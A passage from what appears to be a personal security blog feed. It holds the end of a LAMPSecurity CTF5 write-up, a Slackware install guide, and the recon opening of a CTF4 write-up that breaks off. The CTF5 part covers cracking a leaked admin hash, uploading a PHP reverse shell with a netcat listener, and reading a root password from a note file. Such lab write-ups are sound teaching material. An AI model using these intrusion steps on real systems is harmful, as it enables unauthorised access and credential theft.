<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}</span></code></pre></td></tr></table></div></figure>


<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/nanocms.png" title="nanocms admin panel" alt="admin panel"></p>

<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vvnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
</span><span class='line'>Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
</span><span class='line'> 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-3.2$ whoami
</span><span class='line'>apache</span></code></pre></td></tr></table></div></figure>


<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls
</span><span class='line'>amy
</span><span class='line'>andy
</span><span class='line'>jennifer
</span><span class='line'>loren
</span><span class='line'>patrick</span></code></pre></td></tr></table></div></figure>


<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls -al patrick
</span><span class='line'>total 344
</span><span class='line'>drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
</span><span class='line'>drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
</span><span class='line'>-rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
</span><span class='line'>drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
</span><span class='line'>-rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
</span><span class='line'>-rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
</span><span class='line'>-rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
</span><span class='line'>-rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
</span><span class='line'>-rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
</span><span class='line'>drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
</span><span class='line'>drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
</span><span class='line'>drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
</span><span class='line'>drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
</span><span class='line'>drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
</span><span class='line'>drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
</span><span class='line'>-rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
</span><span class='line'>-rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
</span><span class='line'>drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
</span><span class='line'>-rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
</span><span class='line'>drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
</span><span class='line'>drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
</span><span class='line'>-rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
</span><span class='line'>drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
</span><span class='line'>-rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
</span><span class='line'>drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
</span><span class='line'>-rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
</span><span class='line'>-rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
</span><span class='line'>-rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
</span><span class='line'>-rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
</span><span class='line'>-rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
</span><span class='line'>-rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
</span><span class='line'>drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
</span><span class='line'>-rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ cat .tomboy.log
</span><span class='line'>...
</span><span class='line'>12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
</span><span class='line'>12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
</span><span class='line'>12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
</span><span class='line'>12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
</span><span class='line'>12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
</span><span class='line'>12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
</span><span class='line'>12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!</span></code></pre></td></tr></table></div></figure>


<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ ls
</span><span class='line'>481bca0d-7206-45dd-a459-a72ea1131329.note
</span><span class='line'>addin-db-000
</span><span class='line'>addins
</span><span class='line'>ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
</span><span class='line'>d2684fad-3aab-444c-b90a-4f307c0818f6.note
</span><span class='line'>manifest.xml</span></code></pre></td></tr></table></div></figure>


<p>Found the jackpot in the first one!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy"&gt;
</span><span class='line'>  &lt;title&gt;Root password&lt;/title&gt;
</span><span class='line'>  &lt;text xml:space="preserve"&gt;&lt;note-content version="0.1"&gt;Root password
</span><span class='line'>
</span><span class='line'>Root password
</span><span class='line'>
</span><span class='line'>50$cent&lt;/note-content&gt;&lt;/text&gt;
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Now all that is left is to become root! I SSH&#8217;ed with the root credentials and the machine is mine now!</p>

<h5>Concluding remarks</h5>

<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ It's lucky you're going so slowly, \
</span><span class='line'>| because you're going in the wrong  |
</span><span class='line'>\ direction.                         /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Slackware install guide]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/28/slackware-install-guide/"/>
    <updated>2016-04-28T13:23:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/28/slackware-install-guide</id>
    <content type="html"><![CDATA[<p>Ever since I got into Linux and wanting to learn more and get better at it, I always held an interest towards Slackware. Being one of the oldest distributions around, with a hardcore community and an old-school reputation, it always came in the top answers when it comes to learning Linux without fancy hand holding and the like (along with Arch). But I always liked Slackware, its name is awesome, and well, slackwarez for a slacker! So I&rsquo;ve finally set up some time to install it in a VM, and will get to work on it to deepen my Linux knowledge.</p>

<p>So in this post I will list the steps I went through to install Slackware 14.1 in VMware.</p>

<!-- more -->


<p>The cool thing about this installation was that I had to do some things manually without a GUI where all you do is press next. After selecting your installation media, which was the DVD ISO for me, power up the machine and you will get some command line action!</p>

<p>The first screen is for selecting which kernel to boot to</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootkernel.png" title="boot to kernel" alt="kernel booting"></p>

<p>Select keyboard map</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/keyboard.png" title="keyboard map" alt="select key map"></p>

<p>Log in as root</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/root.png" title="root login" alt="root login"></p>

<h3>Partitioning</h3>

<p>You have to set up partitions before beginning the installation process</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/partition.png" title="partition" alt="partitioning"></p>

<p>I will use cfdisk for this. As you can see, my disk is /dev/sda and is yet yet unpartitioned, so just a big lump of free space.</p>

<blockquote><p>cfdisk &ndash; display or manipulate a disk partition table</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/cfdisk.png" title="cfdisk" alt="cfdisk"></p>

<p>I will make 3 partitions, for swap, root and home. Select [New] to create a new partition. The MBR partitioning scheme supports up to 4 primary partitions, and if you need more than that you can make one of them an extended partition and create  logical partitions inside it. Choose [Primary] to continue</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/primary.png" title="primary partition" alt="primary partition"></p>

<p>Since this will be the swap partition, I will make it a size of 512 MB.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/size.png" title="partition size" alt="swap size"></p>

<p>Next I selected to place it at the beginning of the drive, for simplicity. I&rsquo;ve also read that doing so might make it faster.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/beginning.png" title="partition beginning" alt="beginning partition"></p>

<p>Note how the first partition labeled sda1 was created. Next you have to choose the partition&rsquo;s type</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/type.png" title="partition type" alt="partition type"></p>

<p>See how many different file systems can be created. Choose 82 for swap.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swap.png" title="type swap" alt="swap partition"></p>

<p>Next make the root and home partitions, as described above. Only difference will be that you need to make the root partition bootable</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootable.png" title="bootable partition" alt="root bootable"></p>

<p>Now write the changes to disk. You will be asked to confirm that you want to write the data</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/write.png" title="write partitions" alt="write data"></p>

<p>After it&rsquo;s done you will see a message at the bottom: &ldquo;Wrote partition table to disk&rdquo;. You can quit cfdisk now</p>

<h3>Setup</h3>

<p>Type setup to begin the installation setup process</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/slacksetup.png" title="slackware setup" alt="install setup"></p>

<p>Choose ADDSWAP to format the swap partition that was created earlier. It will be automatically detected by the setup wizard</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swapsetup.png" title="add swap" alt="swap setup"></p>

<p>You can choose to check for bad blocks if you want, but I skipped it</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/badblocks.png" title="check bad blocks" alt="bad blocks"></p>

<p>You will get a message when the swap space is configured</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swapdone.png" title="swap conf" alt="swap conf"></p>

<p>Next you have to choose the root partition, which in my case is sda2</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sda2root.png" title="root partition" alt="root sda2"></p>

<p>I selected the quick format option</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/formatroot.png" title="root format" alt="quick format"></p>

<p>For the filesystem I chose ext4</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/ext4.png" title="ext4" alt="ext4"></p>

<p>The last partition is the home one</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sda3home.png" title="sda3 home" alt="home"></p>

<p>After formatting and choosing its filesystem, you have to specify where you want it mounted. Type /home</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/home.png" title="mount home" alt="home"></p>

<p>The setup of the partitions is now complete</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/partitionsdone.png" title="partitions complete" alt="finished partitioning"></p>

<p>Next you have to choose the source media for the installation. In my case, it is the DVD</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/sourcemedia.png" title="source media" alt="source dvd"></p>

<p>Let the wizard auto scan for the DVD</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/autoscan.png" title="autoscan" alt="dvd scan"></p>

<p>Select the general packages that you want, I kept all except for the KDE ones, since I will be using XFCE for my GUI</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/packages.png" title="package selection" alt="install packages"></p>

<p>I chose the full option for simplicity</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/full.png" title="full install" alt="full"></p>

<p>After the installation process, you can create a boot stick if you want, but I skipped it</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootdisk.png" title="boot stick" alt="boot disk"></p>

<p>The bootloader used by Slackware is LILO. I selected the simple install and the standard console</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilo.png" title="lilo" alt="lilo"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilosplash.png" title="lilo splash screen" alt="lilo console"></p>

<p>Skip the extra parameters unless you know what you&rsquo;re doing</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/kernelparams.png" title="lilo extra parameters" alt="lilo parameters"></p>

<p>You will next be prompted where to install they bootloader. I chose the MBR, since this is a VM dedicated to Slackware. But if this was on a dual booting system with Windows, you would want to install it on root</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/lilombr.png" title="lilo mbr" alt="lilo install"></p>

<p>Choose your mouse type</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/mouse.png" title="mouse type" alt="mouse"></p>

<p>The General Purpose Mouse software provides support for mouse devices in Linux virtual consoles.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/gpm.png" title="general purpose mouse" alt="gpm"></p>

<p>Next is the network configuration</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/net.png" title="network" alt="net config"></p>

<p>Enter your hostname and domain</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/hostname.png" title="hostname" alt="host"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/domain.png" title="domain name" alt="domain"></p>

<p>For simplicity, I chose the Network Manager configuration</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/netconf.png" title="network configuration" alt="network config"></p>

<p>Confirm your choices before continuing</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/netdone.png" title="network setup" alt="net setup"></p>

<p>I went with the default startup services. Will add more on a need-to-use basis</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/startup.png" title="startup services" alt="startup"></p>

<p>You can try custom screen fonts if you want</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/fonts.png" title="custom fonts" alt="screen fonts"></p>

<p>Next is the hardware clock and timezone</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/hwclock.png" title="hardware clock" alt="clock"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/timezone.png" title="timezone" alt="timezone"></p>

<p>For the GUI, I went with XFCE</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/gui.png" title="gui" alt="xfce"></p>

<p>You will be asked to choose a root password next</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/pass.png" title="root password" alt="password"></p>

<p>With this, the installation setup is complete</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/complete.png" title="setup complete" alt="setup finished"></p>

<p>Exit the wizard and reboot your brand new Slackware machine. Hit Enter when you see the splash screen, or it will boot automatically in a couple of minutes</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/slacksplash.png" title="lilo splash screen" alt="lilo boot"></p>

<h3>Booting into your system</h3>

<p>Slackware doesn&rsquo;t run the GUI automatically. You can change this by modifying the default runlevel</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/textlogin.png" title="text login" alt="no gui"></p>

<p>I chose to manually start the GUI so I can read the random quotes that are given at login. You can load the GUI with the <strong>startx</strong> command</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/finished.png" title="slackware" alt="slackware install"></p>

<p>All done! From here you can proceed to use your new distro, or customize it to your liking</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You will experience a strong urge to do \
</span><span class='line'>\ good; but it will pass.                 /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF4]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/"/>
    <updated>2016-04-19T05:40:39-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is part of a CTF series by the LAMPSecurity project.</p>

<!-- more -->


<p>The Nmap scan reveals just a few ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/Downloads#nmap -sS -sV -p1-65535 192.168.80.152
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-03-02 09:26 EST
</span><span class='line'>Nmap scan report for 192.168.80.152
</span><span class='line'>Host is up, received arp-response (0.00038s latency).
</span><span class='line'>Not shown: 65531 filtered ports, 1 closed port
</span><span class='line'>Reason: 65369 no-responses, 162 host-prohibiteds and 1 reset
</span><span class='line'>PORT   STATE SERVICE REASON         VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.3 (protocol 2.0)
</span><span class='line'>25/tcp open  smtp    syn-ack ttl 64 Sendmail 8.13.5/8.13.5
</span><span class='line'>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.0 ((Fedora))
</span><span class='line'>MAC Address: 00:0C:29:1D:B6:45 (VMware)
</span><span class='line'>Service Info: Host: ctf4.sas.upenn.edu; OS: Unix</span></code></pre></td></tr></table></div></figure>


<p>Checking out the web server, we can see this page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/home.png" title="home" alt="home"></p>

<p>Let&rsquo;s get digging!</p>

<h3>Recon</h3>

<p>The Blog section contains some blog posts, for which the URL looks like this: <code><a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5</a></code>. That id parameter calls for SQLi testing and the page parameter could be vulnerable to LFI. But for now, let&rsquo;s keep sniffing around.</p>

<p>One of the things I always do when doing web based challenges is check if there&rsquo;s anything of interest in the <code>robots.txt</code> file. So I did it here as well and I wasn&rsquo;t disappointed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /mail/
</span><span class='line'>Disallow: /restricted/
</span><span class='line'>Disallow: /conf/
</span><span class='line'>Disallow: /sql/
</span><span class='line'>Disallow: /admin/</span></code></pre></td></tr></table></div></figure>


<p>Quite a few places to check! Let&rsquo;s see what we&rsquo;ve got.</p>

<ul>
<li><strong>/mail/</strong></li>
</ul>


<p>This is not your regular mail server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/squirrel.png" title="squirrelmail" alt="squirrelmail"></p>

<p>I&rsquo;ve never seen this before, so I checked the project&rsquo;s homepage:</p>

<blockquote><p>SquirrelMail is a standards-based webmail package written in PHP. It includes built-in pure PHP support for the IMAP and SMTP protocols, and
all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is
very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support,
address books, and folder manipulation.</p></blockquote>

<p>Ok, will come back to this, for now I&rsquo;m just checking the entire thing for possible entry points.</p>

<ul>
<li><strong>/restricted/</strong></li>
</ul>


<p>Trying to get to this folder will pop up a basic authentication window. Moving on</p>

<ul>
<li><strong>/conf/</strong></li>
</ul>


<p>This one gives an internal server error, but discloses the e-mail address of the server administrator: <code>dstevens@localhost</code></p>

<ul>
<li><strong>/sql/</strong></li>
</ul>


<p>Here we have a directory indexing with a db.sql file that contains the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">use</span> <span class="n">ehks</span><span class="p">;</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="k">user</span> <span class="p">(</span><span class="n">user_id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">user_name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span> <span class="n">user_pass</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
